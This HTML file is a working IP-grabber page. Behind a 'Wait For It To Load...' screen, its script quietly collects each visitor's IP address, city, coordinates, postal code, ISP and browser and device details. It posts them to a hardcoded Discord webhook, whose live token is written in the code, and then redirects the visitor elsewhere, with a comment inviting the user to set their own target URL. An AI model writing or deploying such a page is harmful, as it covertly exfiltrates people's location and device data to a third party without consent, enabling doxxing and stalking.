<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>XXN_Test</title>
</head>
<body>
Wait For It To Load...
<script>
  const ipinfo = {}, deviceinfo = {};

  async function gatherIPInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      Object.assign(ipinfo, {
        IP: data.ip,
        City: data.city,
        Region: data.region,
        Country: `${data.country_name} (${data.country})`,
        Postal: data.postal,
        Latitude: data.latitude,
        Longitude: data.longitude,
        ISP: data.org,
        ASN: data.asn || "N/A",
        Timezone: data.timezone,
        Currency: `${data.currency} (${data.currency_name})`
      });
    } catch {
      Object.assign(ipinfo, { Error: "Failed to get IP info" });
    }
  }

  async function gatherDeviceInfo() {
    deviceinfo.Browser = navigator.userAgent;
    deviceinfo.OS = navigator.platform;
    deviceinfo.Platform = navigator.platform;
    deviceinfo.Language = navigator.language;
    deviceinfo.DoNotTrack = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
    deviceinfo.Resolution = `${screen.width} Ã— ${screen.height}`;
    deviceinfo.TimezoneOffset = new Date().getTimezoneOffset() + " minutes";
    return;
  }

  async function collectSendRedirect() {
    await gatherIPInfo();
    await gatherDeviceInfo();

    const lines = [];
    lines.push("**:earth_africa: IP Location:**");
    for (let key in ipinfo) lines.push(`**${key}**: ${ipinfo[key]}`);

    lines.push("\n**:brain: Device Info:**");
    for (let key in deviceinfo) lines.push(`**${key}**: ${deviceinfo[key]}`);

    const payload = { content: lines.join("\n") };

    try {
      // Wait for fetch to finish before redirect
      await fetch("https://discord.com/api/webhooks/1420561724410429472/qq07ULPd7_URtkJ8czru91tH2FRUgCgWbgkUODHXAf2XikB_qxrOhvTsLDKEUFwwvCUw", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    } catch(e) {
      console.error("Failed to send to Discord:", e);
    }

    // Redirect in same tab AFTER sending
    window.location.href = "https://vapor.my/"; // <-- replace with your target URL
  }

  collectSendRedirect();
</script>
</body>
</html>
